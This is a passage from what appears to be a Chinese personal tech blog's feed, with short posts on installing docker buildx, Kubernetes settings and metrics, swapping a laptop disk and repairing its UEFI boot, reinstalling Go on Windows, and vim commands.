11:29 qemu-s390x<br>--w------- 1 root root 0 Feb  4 21:40 register<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 status<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># grep -r &quot;enabled&quot; /proc/sys/fs/binfmt_misc/ </span><br>/proc/sys/fs/binfmt_misc/qemu-s390x:enabled<br>/proc/sys/fs/binfmt_misc/qemu-arm:enabled<br>/proc/sys/fs/binfmt_misc/qemu-aarch64:enabled<br>/proc/sys/fs/binfmt_misc/qemu-mips64:enabled<br>/proc/sys/fs/binfmt_misc/qemu-ppc64le:enabled<br>/proc/sys/fs/binfmt_misc/qemu-mips64el:enabled<br>/proc/sys/fs/binfmt_misc/qemu-riscv64:enabled<br>/proc/sys/fs/binfmt_misc/jar:enabled<br>/proc/sys/fs/binfmt_misc/python2.7:enabled<br>/proc/sys/fs/binfmt_misc/llvm-6.0-runtime.binfmt:enabled<br>/proc/sys/fs/binfmt_misc/python3.6:enabled<br>grep: /proc/sys/fs/binfmt_misc/register: Invalid argument<br>/proc/sys/fs/binfmt_misc/status:enabled<br>[root@ningan ~]<span class="hljs-comment"># docker buildx</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br><br><br></code></pre></td></tr></table></figure><h2 id="尝试5：安装docker-buildx-plugin-–-gt-docker-buildx-成功"><a href="#尝试5：安装docker-buildx-plugin-–-gt-docker-buildx-成功" class="headerlink" title="尝试5：安装docker-buildx-plugin –&gt; docker buildx 成功"></a>尝试5：安装docker-buildx-plugin –&gt; docker buildx 成功</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># sudo apt install docker-buildx-plugin</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package docker-buildx-plugin<br>[root@ningan ~]<span class="hljs-comment"># apt update</span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease             <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease              <br>Hit:4 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease              <br>Reading package lists... Done                                                   <br>Building dependency tree       <br>Reading state information... Done<br>5 packages can be upgraded. Run <span class="hljs-string">&#x27;apt list --upgradable&#x27;</span> to see them.<br><br><span class="hljs-comment"># 添加 Docker 官方 GPG 密钥：</span><br>[root@ningan ~]<span class="hljs-comment"># curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br>OK<br><span class="hljs-comment"># 添加 Docker 官方仓库：</span><br>[root@ningan ~]<span class="hljs-comment"># sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease              <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease                <br>Hit:4 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease              <br>Get:5 https://download.docker.com/linux/ubuntu bionic InRelease [64.4 kB]<br>Get:6 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages [39.0 kB]<br>Fetched 103 kB <span class="hljs-keyword">in</span> 4s (24.2 kB/s)    <br>Reading package lists... Done<br><br><span class="hljs-comment"># 更新软件源列表并安装 `docker-buildx-plugin`</span><br>[root@ningan ~]<span class="hljs-comment"># sudo apt update  </span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease                                                               <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease                                                                 <br>Hit:4 https://download.docker.com/linux/ubuntu bionic InRelease                                                                  <br>Hit:5 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease        <br>Reading package lists... Done                      <br>Building dependency tree       <br>Reading state information... Done<br>5 packages can be upgraded. Run <span class="hljs-string">&#x27;apt list --upgradable&#x27;</span> to see them.<br>[root@ningan ~]<span class="hljs-comment"># sudo apt install docker-buildx-plugin</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following packages were automatically installed and are no longer required:<br>  linux-hwe-5.4-headers-5.4.0-126 linux-hwe-5.4-headers-5.4.0-131 linux-hwe-5.4-headers-5.4.0-132 linux-hwe-5.4-headers-5.4.0-135<br>  linux-hwe-5.4-headers-5.4.0-136 linux-hwe-5.4-headers-5.4.0-137 linux-hwe-5.4-headers-5.4.0-139 linux-hwe-5.4-headers-5.4.0-144<br>  linux-hwe-5.4-headers-5.4.0-146 linux-hwe-5.4-headers-5.4.0-147 linux-hwe-5.4-headers-5.4.0-148 pkg-php-tools shtool<br>Use <span class="hljs-string">&#x27;sudo apt autoremove&#x27;</span> to remove them.<br>The following NEW packages will be installed:<br>  docker-buildx-plugin<br>0 upgraded, 1 newly installed, 0 to remove and 5 not upgraded.<br>Need to get 26.1 MB of archives.<br>After this operation, 71.2 MB of additional disk space will be used.<br>Get:1 https://download.docker.com/linux/ubuntu bionic/stable amd64 docker-buildx-plugin amd64 0.10.5-1~ubuntu.18.04~bionic [26.1 MB]<br>Fetched 26.1 MB <span class="hljs-keyword">in</span> 7s (3,669 kB/s)                                                                                                    <br>Selecting previously unselected package docker-buildx-plugin.<br>(Reading database ... 382316 files and directories currently installed.)<br>Preparing to unpack .../docker-buildx-plugin_0.10.5-1~ubuntu.18.04~bionic_amd64.deb ...<br>Unpacking docker-buildx-plugin (0.10.5-1~ubuntu.18.04~bionic) ...<br>Setting up docker-buildx-plugin (0.10.5-1~ubuntu.18.04~bionic) ...<br>[root@ningan ~]<span class="hljs-comment"># docker buildx version</span><br>github.com/docker/buildx v0.10.5 86bdced<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【secureCRT】(202402) windows下安装secureCRT</title>
    <link href="/2024/02/07/software/%E3%80%90secureCRT%E3%80%91(202402)%20windows%E4%B8%8B%E5%AE%89%E8%A3%85secureCRT/"/>
    <url>/2024/02/07/software/%E3%80%90secureCRT%E3%80%91(202402)%20windows%E4%B8%8B%E5%AE%89%E8%A3%85secureCRT/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/510914995">https://zhuanlan.zhihu.com/p/510914995</a>   安装包下载的这个地方的</p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202402) pod的spec和status中容器image不一样</title>
    <link href="/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20pod%E7%9A%84spec%E5%92%8Cstatus%E4%B8%AD%E5%AE%B9%E5%99%A8image%E4%B8%8D%E4%B8%80%E6%A0%B7/"/>
    <url>/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20pod%E7%9A%84spec%E5%92%8Cstatus%E4%B8%AD%E5%AE%B9%E5%99%A8image%E4%B8%8D%E4%B8%80%E6%A0%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_42303254/article/details/120039678">05-【docker】spec.containers[x].image 与 status.containerStatuses[x].image这两个必须一致吗？_signed must be an image digest: spec.containers[0]-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】证书apiserver_client_certificate_expiration_seconds</title>
    <link href="/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20%E8%AF%81%E4%B9%A6apiserver_client_certificate_expiration_seconds/"/>
    <url>/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20%E8%AF%81%E4%B9%A6apiserver_client_certificate_expiration_seconds/</url>
    
    <content type="html"><![CDATA[<h2 id="普罗表达式"><a href="#普罗表达式" class="headerlink" title="普罗表达式"></a>普罗表达式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiserver_client_certificate_expiration_seconds_count&#123;job=<span class="hljs-string">&quot;apiserver&quot;</span>&#125; &gt; 0 and on(job) histogram_quantile(0.01, <span class="hljs-built_in">sum</span> by (job, le) (rate(apiserver_client_certificate_expiration_seconds_bucket&#123;job=<span class="hljs-string">&quot;apiserver&quot;</span>&#125;[5m])))<br><br></code></pre></td></tr></table></figure><h2 id="相关官方解释"><a href="#相关官方解释" class="headerlink" title="相关官方解释"></a>相关官方解释</h2><p>apiserver_client_certificate_expiration_second证书定义的位置：<a href="https://github.com/kubernetes/kubernetes/blob/244fbf94fd736e94071a77a8b7c91d81163249d4/staging/src/k8s.io/apiserver/pkg/authentication/request/x509/x509.go#L48">kubernetes&#x2F;staging&#x2F;src&#x2F;k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;authentication&#x2F;request&#x2F;x509&#x2F;x509.go at 244fbf94fd736e94071a77a8b7c91d81163249d4 · kubernetes&#x2F;kubernetes (github.com) </a></p><p>apiserver_client_certificate_expiration_seconds表示的含义：<a href="https://github.com/kubernetes/kubernetes/commit/f90bbc3d6bfba992831eb216161990eae1098ae5">src&#x2F;k8s.io&#x2F;apiserver: Increase cert expiration histogram resolution · kubernetes&#x2F;kubernetes@f90bbc3 (github.com)</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240206121620.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/%7B64282e77-9fe7-41fc-86eb-f9dc730ed67e%7D.png" alt="{64282e77-9fe7-41fc-86eb-f9dc730ed67e}.png"></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【硬盘】(202402)纪念第一次换笔记本硬盘</title>
    <link href="/2024/02/04/windows/%E3%80%90%E7%A1%AC%E7%9B%98%E3%80%91(202402)%E7%BA%AA%E5%BF%B5%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8D%A2%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%A1%AC%E7%9B%98/"/>
    <url>/2024/02/04/windows/%E3%80%90%E7%A1%AC%E7%9B%98%E3%80%91(202402)%E7%BA%AA%E5%BF%B5%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8D%A2%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%A1%AC%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔记本的硬盘只有500G，太小了，想换一个1T的硬盘</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>diskGenius：硬盘拷贝</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="硬盘拷贝"><a href="#硬盘拷贝" class="headerlink" title="硬盘拷贝"></a>硬盘拷贝</h3><p>打开diskGenius<br>选择“工具”-&gt;“克隆磁盘”-&gt;<br>选择“源磁盘”和“目的磁盘”</p><p>选择“热拷贝”，漫长的等待~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204214640.png" alt="image.png"></p><h3 id="换硬盘"><a href="#换硬盘" class="headerlink" title="换硬盘"></a>换硬盘</h3><p>将旧的硬盘拆下来，换上新的硬盘</p><h3 id="启动计算机"><a href="#启动计算机" class="headerlink" title="启动计算机"></a>启动计算机</h3><p>启动计算机，界面如下，这样子是因为引导出现了问题，需要修复一下引导</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/650a9e2fb237624be36d3d7048cc7ed.jpg" style="transform:rotate(270deg);"><h3 id="制作pe"><a href="#制作pe" class="headerlink" title="制作pe"></a>制作pe</h3><p>搜索“微pe工具箱”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215537.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215643.png" alt="image.png"></p><p>我没插u盘，插了u盘之后，“待写入U盘”的地方会读到东西，点击安装即可~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215726.png" alt="image.png"></p><h3 id="修复引导"><a href="#修复引导" class="headerlink" title="修复引导"></a>修复引导</h3><p>装完pe之后，将u盘插入电脑，启动计算机，疯狂按F12，进入类似下面的界面，选择从u盘启动</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/6e2e7885e510da60efe47cd9b1dc69d.jpg" alt="6e2e7885e510da60efe47cd9b1dc69d.jpg"></p><p>点击“Windows”，选择“Windows引导修复”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/fda878982ec474c6abb3052bad13633.jpg" alt="fda878982ec474c6abb3052bad13633.jpg"></p><p>选择“修UEFI引导”，引导盘会自动的切到Z盘，可以看到Z盘有EFI启动文件，点击“开始修复”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/8c691ddfff4e9e95b8b399f08ceff4e.jpg" alt="8c691ddfff4e9e95b8b399f08ceff4e.jpg"></p><p>修复之后，点击“Windows引导修复”下的“BCD引导编辑”，可以看到有两个Window11，比较一下发现，下面那个“Windows11”的device和osdevice都是unknows，而“Windows11【默认】”都是partition&#x3D;C:<br>(下面这个我已经改过了)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/478833ccfb0058690c2bbf7e0e50af9.jpg" alt="478833ccfb0058690c2bbf7e0e50af9.jpg"></p><h3 id="重新启动"><a href="#重新启动" class="headerlink" title="重新启动"></a>重新启动</h3><p>重新启动计算机，有两个选项，第一个可以进去，第二个进不去(忘记截图了)</p><p>当把上面说到的2个unknown改成“partition&#x3D;C:”后，把“Windows11【默认】”删掉之后，重启计算机只剩下了一个选择，可以正常进入系统~</p><p>至此，硬盘替换完毕，又get了一项新技能~</p><p>慢慢来，每天进步一点点，未来的你终究会感谢现在奋斗的自己~</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】06.obsidian中如何统计每个文件夹下文件的个数？File Explorer Note Count</title>
    <link href="/2024/01/31/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9106.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9FFile%20Explorer%20Note%20Count/"/>
    <url>/2024/01/31/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9106.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9FFile%20Explorer%20Note%20Count/</url>
    
    <content type="html"><![CDATA[<p>直接在插件市场安装即可，效果图如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131131802.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【go系列】(202401) windows下go环境的安装与删除</title>
    <link href="/2024/01/11/software/%E3%80%90go%E7%B3%BB%E5%88%97%E3%80%91(202401)%20windows%E4%B8%8Bgo%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%A0%E9%99%A4/"/>
    <url>/2024/01/11/software/%E3%80%90go%E7%B3%BB%E5%88%97%E3%80%91(202401)%20windows%E4%B8%8Bgo%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%A0%E9%99%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>Windows. 删除Go 的最简单方法是通过Windows 控制面板中的添加&#x2F;删除程序: <strong>在控制面板中，双击添加&#x2F;删除程序.</strong> <strong>在添加&#x2F;删除程序中, 选择Go Programming Language, 单击Uninstall，然后按照提示进行操作</strong>.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">删除go目录下的所有文件   D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Go</span><br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 如何修改GOPROXY</span><br>go env -w GOPROXY=https:<span class="hljs-regexp">//g</span>oproxy.cn,direct<br></code></pre></td></tr></table></figure><h2 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111120757.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111120742.png" alt="image.png"></p><p><a href="https://developer.aliyun.com/article/1042772">Windows Go 开发环境下载、安装并配置 -阿里云开发者社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【goland报错解决】Acosh defined in both Go and assembly</title>
    <link href="/2024/01/11/tools/%E3%80%90goland%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E3%80%91Acosh%20defined%20in%20both%20Go%20and%20assembly/"/>
    <url>/2024/01/11/tools/%E3%80%90goland%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E3%80%91Acosh%20defined%20in%20both%20Go%20and%20assembly/</url>
    
    <content type="html"><![CDATA[<h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS E:\code\go-helloworld&gt; go run main.go<br><span class="hljs-comment"># math</span><br>D:\Program Files\Go\src\math\acosh.go:43:6: Acosh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asin.go:20:6: Asin defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asin.go:58:6: Acos defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asinh.go:40:6: Asinh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atan.go:96:6: Atan defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atan2.go:30:6: Atan2 defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atanh.go:48:6: Atanh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\cbrt.go:26:6: Cbrt defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:189:6: Erf defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:274:6: Erfc defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:274:6: too many errors<br>PS E:\code\go-helloworld&gt;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111111159.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在网上查找资料&amp;分析报错，可推断出环境里重复的东西，所以打算把go环境删除，再安装一个试试</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>Windows. 删除Go 的最简单方法是通过Windows 控制面板中的添加&#x2F;删除程序: <strong>在控制面板中，双击添加&#x2F;删除程序.</strong> <strong>在添加&#x2F;删除程序中, 选择Go Programming Language, 单击Uninstall，然后按照提示进行操作</strong>.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">删除go目录下的所有文件   D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Go</span><br></code></pre></td></tr></table></figure><p>注意：第一次删除的时候，没有删除go目录下的所有文件，安装之后，还是一样的报错；第二次把go目录下的所有文件都删除，再次安装就可以正常运行了</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 如何修改GOPROXY</span><br>go env -w GOPROXY=https:<span class="hljs-regexp">//g</span>oproxy.cn,direct<br></code></pre></td></tr></table></figure><p><a href="https://developer.aliyun.com/article/1042772">Windows Go 开发环境下载、安装并配置 -阿里云开发者社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202401) 修改k8s限制节点启动的Pod数量</title>
    <link href="/2024/01/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202401)%20%E4%BF%AE%E6%94%B9k8s%E9%99%90%E5%88%B6%E8%8A%82%E7%82%B9%E5%90%AF%E5%8A%A8%E7%9A%84Pod%E6%95%B0%E9%87%8F/"/>
    <url>/2024/01/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202401)%20%E4%BF%AE%E6%94%B9k8s%E9%99%90%E5%88%B6%E8%8A%82%E7%82%B9%E5%90%AF%E5%8A%A8%E7%9A%84Pod%E6%95%B0%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h1><p>修改kubelet的配置</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--max-pods int32     默认值：110</span><br></code></pre></td></tr></table></figure><h1 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h1><p>修改kubelet的配置文件 默认：110</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">maxPods</span>: <span class="hljs-number">300</span> <br></code></pre></td></tr></table></figure><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kubelet/">kubelet | Kubernetes</a>  方法1<br><a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1/">Kubelet 配置 (v1beta1) | Kubernetes</a>  方法2</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】vim命令每日学习</title>
    <link href="/2024/01/07/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91vim%E5%91%BD%E4%BB%A4%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/07/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91vim%E5%91%BD%E4%BB%A4%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>前言：听说，只要把vim学会了，就再也不想用别的编辑器了，想试试这句话是不是真的！学vim非一日之功，重在多用。我们，慢慢来！<br>——————————————————————————————</p><p><a href="https://www.cnblogs.com/hxf-changmylife/p/5918052.html">参考学习链接</a><br><a href="https://blog.csdn.net/niushuai666/article/details/7275406">参考学习链接</a></p><h1 id="2021-01-04-一"><a href="#2021-01-04-一" class="headerlink" title="2021.01.04(一)"></a>2021.01.04(一)</h1><h2 id="粘贴复制删除"><a href="#粘贴复制删除" class="headerlink" title="粘贴复制删除"></a>粘贴复制删除</h2><p><font color=red>普通模式下：</font></p><p>dd → 删除当前行，并把删除的行存到剪贴板里   (辅助记忆：delete)<br>yy → 拷贝当前行<br>p → 粘贴  在当前位置之后   (辅助记忆：paste)<br>P → 粘贴 在当前位置之前   (辅助记忆：我们一般打字都是从前往后打，一般情况也是小写，所以小写的是从后的，大写的不太常见，是往前的)<br>x → 删当前光标所在的一个字符   (辅助记忆：我们是不是常用ctrl+x表示剪切嘛，这个也是x呀，联想记忆)</p><h1 id="2021-01-13-三"><a href="#2021-01-13-三" class="headerlink" title="2021.01.13(三)"></a>2021.01.13(三)</h1><h2 id="各种插入模式"><a href="#各种插入模式" class="headerlink" title="各种插入模式"></a>各种插入模式</h2><p><font color=red>普通模式(即，命令行模式)下：</font></p><p>a → 在光标后插入<br>o → 在当前行后插入一个新行<br>O → 在当前行前插入一个新行 (大写o)</p><h2 id="简单的移动光标"><a href="#简单的移动光标" class="headerlink" title="简单的移动光标"></a>简单的移动光标</h2><p>0 → 数字零，到行头<br>$ → 到本行行尾<br>^ → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等）<br>g_ → 到本行最后一个不是blank字符的位置</p><h2 id="搜索某个字符串"><a href="#搜索某个字符串" class="headerlink" title="搜索某个字符串"></a>搜索某个字符串</h2><p><a href="https://www.cnblogs.com/z-x-y/p/9198481.html">参考链接</a></p><h3 id="从开头搜索"><a href="#从开头搜索" class="headerlink" title="从开头搜索"></a>从开头搜索</h3><p>在<font color=red>普通模式下</font>，输入<font color=red>&#x2F;你要查找的字符</font><br>eg.你要查找“安安”，就在普通模式下，输入&#x2F;安安</p><p>按下<font color=red>回车</font>，可以看到vim把光标移动到该字符处</p><p>再按<font color=red>n（小写）</font>查看下一个匹配  光标往下移<br>按<font color=red>N(大写）</font>查看上一个匹配（capslock切换大小写，也可以在小写状态下按shift+n）</p><h3 id="从结尾处搜索"><a href="#从结尾处搜索" class="headerlink" title="从结尾处搜索"></a>从结尾处搜索</h3><p>在<font color=red>普通模式下</font>，输入<font color=red>？你要查找的字符</font><br>再按<font color=red>n（小写）</font> 光标往上移<br>按<font color=red>N(大写）</font></p><h3 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h3><p>搜索后，发现当前文件和别的文件发现也被高亮了，怎么关闭<br><font color=red>普通模式</font>下，输入：nohlsearch或者：set nohlsearch<br>可以简写成<font color=red>noh</font>或set-noh<br>(联想记忆：hl—highlight 表示高亮)</p><h1 id="2021-01-22-五"><a href="#2021-01-22-五" class="headerlink" title="2021.01.22(五)"></a>2021.01.22(五)</h1><h2 id="vim-如何通过命令快捷跳转到文件头-amp-文件尾-？"><a href="#vim-如何通过命令快捷跳转到文件头-amp-文件尾-？" class="headerlink" title="vim 如何通过命令快捷跳转到文件头 &amp; 文件尾 ？"></a>vim 如何通过命令快捷跳转到文件头 &amp; 文件尾 ？</h2><p><a href="https://blog.csdn.net/dieyong/article/details/80971415">参考博客</a></p><p><font color=red>普通模式(即，命令行模式)下：</font></p><p>方式1 ：<br>跳转到文件头输入冒号(:)，打开命令输入框输入命令1，（注：是数字1）<br>跳转到文件尾输入冒号(:)，打开命令输入框输入命令：$</p><p>方式2 ：<br>gg:命令将光标移动到文档开头<br>G:命令将光标移动到文档末尾</p><h1 id="2021-03-17-三"><a href="#2021-03-17-三" class="headerlink" 